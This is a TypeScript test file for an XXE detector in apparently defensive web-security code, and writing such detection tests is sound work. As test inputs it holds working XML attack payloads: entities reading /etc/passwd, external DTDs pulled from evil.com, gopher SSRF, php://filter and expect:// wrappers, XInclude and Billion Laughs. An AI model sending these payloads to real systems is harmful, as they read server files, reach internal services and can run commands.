/**
 * XXE Detector Tests
 */

import { describe, it, expect } from 'vitest';
import { XXEDetector } from './xxe.detector';
import { AttackType, SecuritySeverity } from '../types';

// Helper to create XML request
const createXMLRequest = (body: string, contentType = 'application/xml') =>
  new Request('https://example.com/api', {
    method: 'POST',
    headers: { 'content-type': contentType },
    body,
  });

describe('XXEDetector', () => {
  const detector = new XXEDetector();

  describe('SYSTEM Entity Detection', () => {
    it('should detect SYSTEM entity declaration', async () => {
      const xml = `<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.attackType).toBe(AttackType.XXE);
      expect(result?.severity).toBe(SecuritySeverity.CRITICAL);
    });

    it('should detect PUBLIC entity declaration', async () => {
      const xml = `<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe PUBLIC "any" "http://evil.com/xxe.dtd">
        ]>
        <foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.attackType).toBe(AttackType.XXE);
    });
  });

  describe('File Protocol Detection', () => {
    it('should detect file:// in entity', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.severity).toBe(SecuritySeverity.CRITICAL);
    });

    it('should detect /etc/passwd target', async () => {
      const xml = `<!DOCTYPE test [<!ENTITY x SYSTEM "/etc/passwd">]><test>&x;</test>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });

    it('should detect Windows file paths', async () => {
      const xml = `<!DOCTYPE test [<!ENTITY x SYSTEM "file:///c:/windows/system.ini">]><test>&x;</test>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('Parameter Entity Detection', () => {
    it('should detect parameter entity with SYSTEM', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.severity).toBe(SecuritySeverity.CRITICAL);
    });
  });

  describe('Network Protocol Detection', () => {
    it('should detect HTTP protocol in entity', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/data">]><foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      // SYSTEM entity is CRITICAL regardless of protocol
      expect(result?.severity).toBe(SecuritySeverity.CRITICAL);
    });

    it('should detect FTP protocol in entity', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/file">]><foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });

    it('should detect Gopher protocol (SSRF)', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:25/">]><foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.severity).toBe(SecuritySeverity.CRITICAL);
    });
  });

  describe('PHP Wrapper Detection', () => {
    it('should detect php://filter', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.severity).toBe(SecuritySeverity.CRITICAL);
    });

    it('should detect expect:// wrapper', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('Billion Laughs Detection', () => {
    it('should detect Billion Laughs pattern', async () => {
      const xml = `<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
      ]>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('XInclude Detection', () => {
    it('should detect XInclude directive', async () => {
      const xml = `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include href="file:///etc/passwd" parse="text"/>
      </foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('DOCTYPE with External DTD', () => {
    it('should detect external DTD URL', async () => {
      const xml = `<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo>test</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });

    it('should detect local DTD file', async () => {
      const xml = `<!DOCTYPE foo SYSTEM "file:///usr/share/xml/dtd.dtd"><foo>test</foo>`;
      
      const request = createXMLRequest(xml);
      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('Content Type Handling', () => {
    it('should check application/xml', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo/>`;
      const request = createXMLRequest(xml, 'application/xml');

      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });

    it('should check text/xml', async () => {
      const xml = `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo/>`;
      const request = createXMLRequest(xml, 'text/xml');

      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });

    it('should check image/svg+xml', async () => {
      const svg = `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`;
      const request = createXMLRequest(svg, 'image/svg+xml');

      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });

    it('should skip non-XML content types by default', async () => {
      const detector = new XXEDetector();
      const request = createXMLRequest(
        `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
        'text/plain'
      );

      const result = await detector.detectRequest(request, {});

      expect(result).toBeNull();
    });

    it('should check all types when configured', async () => {
      const detector = new XXEDetector({ contentTypes: ['*'] });
      const request = createXMLRequest(
        `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
        'text/plain'
      );

      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('Query Parameter Checking', () => {
    it('should check query parameters by default', async () => {
      const detector = new XXEDetector();
      const request = new Request(
        'https://example.com/api?xml=' + 
        encodeURIComponent('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
        { method: 'GET' }
      );

      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
      expect(result?.evidence?.field).toBe('query.xml');
    });
  });

  describe('URL Encoding Bypass', () => {
    it('should detect URL-encoded XXE', async () => {
      const encoded = encodeURIComponent('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>');
      const request = new Request(
        `https://example.com/api?data=${encoded}`,
        { method: 'GET' }
      );

      const result = await detector.detectRequest(request, {});

      expect(result).not.toBeNull();
    });
  });

  describe('Safe Input', () => {
    it('should not detect normal XML', async () => {
      const xml = `<?xml version="1.0"?><user><name>John</name></user>`;
      const request = createXMLRequest(xml);

      const result = await detector.detectRequest(request, {});

      expect(result).toBeNull();
    });

    it('should not detect XML with standard entities', async () => {
      const xml = `<text>Hello &amp; World &lt;test&gt;</text>`;
      const request = createXMLRequest(xml);

      const result = await detector.detectRequest(request, {});

      expect(result).toBeNull();
    });

    it('should not detect non-XML content', async () => {
      const json = '{"name": "John", "data": "test"}';
      const request = new Request('https://example.com/api', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: json,
      });

      const result = await detector.detectRequest(request, {});

      expect(result).toBeNull();
    });
  });

  describe('Configuration', () => {
    it('should have correct name and phase', () => {
      expect(detector.name).toBe('xxe');
      expect(detector.phase).toBe('request');
      expect(detector.priority).toBe(90);
    });

    it('should exclude specified fields', async () => {
      const detector = new XXEDetector({ excludeFields: ['xml_template'] });
      const request = new Request(
        'https://example.com/api?xml_template=' + 
        encodeURIComponent('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
        { method: 'GET' }
      );

      const result = await detector.detectRequest(request, {});

      expect(result).toBeNull();
    });

    it('should provide static patterns', () => {
      expect(XXEDetector.PATTERNS).toBeDefined();
      expect(XXEDetector.PATTERNS.length).toBeGreaterThan(0);
    });
  });
});
